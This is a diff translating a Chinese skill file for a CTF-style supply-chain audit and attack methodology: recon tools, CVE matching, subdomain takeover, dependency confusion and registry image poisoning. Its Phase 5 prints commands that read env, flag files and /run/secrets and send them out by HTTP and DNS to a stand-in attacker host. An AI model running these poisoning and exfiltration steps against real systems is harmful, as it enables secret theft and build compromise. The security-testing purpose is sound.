@@ -1,93 +1,96 @@
 ---
 name: supply-chain-audit
-description: "供应链安全审计与攻击。当指纹识别发现 WordPress/Jenkins/Struts/Django 等已知框架、或发现 /package.json /composer.json /package-lock.json /Gemfile 等依赖声明文件时使用。也适用于发现 CI/CD 构建系统（Jenkins/GitLab CI/OpsFlow）、私有镜像仓库（Harbor/Nexus/Verdaccio）、或题目涉及供应链投毒/dependency confusion 场景。框架和组件版本直接关联 CVE——这是利用链的第一步，也是最容易忽略的攻击面"
+description: "Supply chain security audit and attack. Use when fingerprinting reveals known frameworks such as WordPress/Jenkins/Struts/Django, or when dependency manifest files such as /package.json /composer.json /package-lock.json /Gemfile are found. Also applies when CI/CD build systems (Jenkins/GitLab CI/OpsFlow), private registries (Harbor/Nexus/Verdaccio) are discovered, or when the challenge involves supply chain poisoning / dependency confusion scenarios. Framework and component versions map directly to CVEs — this is the first step of an exploit chain and the most easily overlooked attack surface"
+zh-signals: "审计供应链组件与构建环境风险，覆盖 CVE 关联、子域名接管与依赖投毒。信号:供应链安全,组件漏洞,子域名接管,dependency confusion,CI/CD投毒。"
+when-to-use: >-
+  Use when fingerprinting reveals known frameworks or dependency manifests, or when the target involves CI/CD build systems, private registries, or supply-chain poisoning scenarios.
 metadata:
-  tags: "supply-chain,component,cdn,third-party,js,npm,subdomain-takeover,供应链,组件安全,dependency-confusion,投毒,poisoning,build,pipeline,cicd,registry,harbor,nexus"
+  tags: "supply-chain,component,cdn,third-party,js,npm,subdomain-takeover,supply-chain-security,component-security,dependency-confusion,supply-chain-poisoning,poisoning,build,pipeline,cicd,registry,harbor,nexus"
   category: "exploit"
 ---
 
-# 供应链安全审计方法论
+# Supply Chain Security Audit Methodology
 
-供应链攻击不需要突破目标的代码——只需要目标依赖的某个组件有漏洞或被投毒。
+A supply chain attack does not require breaking the target's own code — it only requires one of the components the target depends on to be vulnerable or poisoned.
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- 子域名接管、CDN/SRI 安全、第三方脚本风险、退役组件、风险评估矩阵 → [references/supply-chain-deep.md](references/supply-chain-deep.md)
-- **主动供应链攻击**：Dependency Confusion、镜像投毒、CI/CD 注入、构建环境密钥窃取 → [references/supply-chain-attack.md](references/supply-chain-attack.md)
+- Subdomain takeover, CDN/SRI security, third-party script risks, retired components, risk assessment matrix → [references/supply-chain-deep.md](references/supply-chain-deep.md)
+- **Active supply chain attacks**: Dependency Confusion, registry poisoning, CI/CD injection, build environment secret theft → [references/supply-chain-attack.md](references/supply-chain-attack.md)
 
-## Phase 1: 组件发现
+## Phase 1: Component Discovery
 
-### 前端 JS 库识别
+### Frontend JS Library Identification
 ```bash
 katana -u http://target -silent -d 2
 ```
-从 HTML/JS 提取：`<script src="...jquery-3.6.0.min.js">` → jQuery 3.6.0
+Extract from HTML/JS: `<script src="...jquery-3.6.0.min.js">` → jQuery 3.6.0
 
-### 后端技术栈
+### Backend Technology Stack
 ```bash
 curl -sI http://target | grep -i "Server\|X-Powered-By\|X-AspNet"
 httpx -u http://target -tech-detect -silent
 ```
-响应头：`X-Powered-By: Express` | `Server: Apache/2.4.41` | `X-AspNet-Version`
+Response headers: `X-Powered-By: Express` | `Server: Apache/2.4.41` | `X-AspNet-Version`
 
-### 子域名 → 第三方服务映射
+### Subdomain → Third-Party Service Mapping
 ```bash
 subfinder -d target.com -silent
 ksubdomain -d target.com
 ```
-检查 CNAME：`status.target.com → statuspage.io` | `docs.target.com → gitbook.io`
+Check CNAME: `status.target.com → statuspage.io` | `docs.target.com → gitbook.io`
 
-## Phase 2: 已知漏洞关联
+## Phase 2: Known Vulnerability Correlation
 
-组件+版本 → CVE 匹配：
-- jQuery < 3.5.0 → XSS | lodash < 4.17.21 → 命令注入
-- Log4j 2.0-2.14.1 → RCE | Apache 2.4.49-2.4.50 → 路径穿越 RCE
+Component + version → CVE matching:
+- jQuery < 3.5.0 → XSS | lodash < 4.17.21 → command injection
+- Log4j 2.0-2.14.1 → RCE | Apache 2.4.49-2.4.50 → path traversal RCE
 
 ```bash
 nuclei -u http://target -severity critical,high
 ```
 
-## Phase 3: 子域名接管
-CNAME 指向已注销服务 → 攻击者注册 → 控制子域名内容
-→ 检测方法和可接管服务列表 → [references/supply-chain-deep.md](references/supply-chain-deep.md)
+## Phase 3: Subdomain Takeover
+CNAME points to a decommissioned service → attacker registers it → controls the subdomain content
+→ Detection methods and the list of claimable services → [references/supply-chain-deep.md](references/supply-chain-deep.md)
 
-## Phase 4: CDN 和外部资源
-无 SRI 的 CDN 引用 = CDN 被入侵即中招
-→ 详细评估方法 → [references/supply-chain-deep.md](references/supply-chain-deep.md)
+## Phase 4: CDN and External Resources
+CDN references without SRI = compromise the CDN and the target is compromised
+→ Detailed assessment methods → [references/supply-chain-deep.md](references/supply-chain-deep.md)
 
-## Phase 5: 主动供应链攻击（投毒）
+## Phase 5: Active Supply Chain Attacks (Poisoning)
 
-当目标运行构建系统且使用私有包/镜像仓库时，可通过投毒获取构建环境中的 flag/密钥。
+When the target runs a build system and uses private package or image registries, poisoning can be used to obtain the flag/secrets inside the build environment.
 
-### 5.1 侦察构建环境
+### 5.1 Recon the Build Environment
 ```bash
-# 发现私有 Registry
+# Discover private registries
 curl -s http://registry:5000/v2/_catalog              # Docker
 curl -s http://nexus:8081/service/rest/v1/search       # Nexus
 curl -s http://verdaccio:4873/-/all | jq 'keys[]'     # npm
 
-# 从构建日志/配置提取内部包名
+# Extract internal package names from build logs/config
 grep -r 'npm install\|pip install\|docker pull' /build/ /ci/
 ```
 
 ### 5.2 Dependency Confusion
-上传同名高版本包到公共/可写 Registry → 构建系统拉取攻击者的包 → install hook 执行恶意代码
+Upload a same-named higher-version package to a public/writable registry → the build system pulls the attacker's package → install hook executes malicious code
 
-### 5.3 镜像 Tag 覆盖
-推送同 tag 的恶意镜像 → 下次构建拉取被毒化的 base image
+### 5.3 Image Tag Overwriting
+Push a malicious image with the same tag → the next build pulls the poisoned base image
 
-### 5.4 构建环境 Flag 提取
+### 5.4 Flag Extraction from the Build Environment
 ```bash
 env | grep -i flag
 find / -name "flag*" 2>/dev/null
 cat /run/secrets/*
-# 通过 HTTP/DNS 外传
+# Exfiltrate over HTTP/DNS
 curl http://attacker/exfil -d "$(cat /flag*)"
 nslookup $(cat /flag* | base64 -w0).attacker.com
 ```
 
-→ 完整攻击步骤和 payload → [references/supply-chain-attack.md](references/supply-chain-attack.md)
+→ Full attack steps and payloads → [references/supply-chain-attack.md](references/supply-chain-attack.md)
 
-## 注意事项
-- 核心是**完整性**——漏掉一个组件就可能漏掉关键风险
-- 子域名接管是最容易出成果的方向
+## Notes
+- The core is **completeness** — missing a single component may mean missing a critical risk
+- Subdomain takeover is the easiest direction to produce results
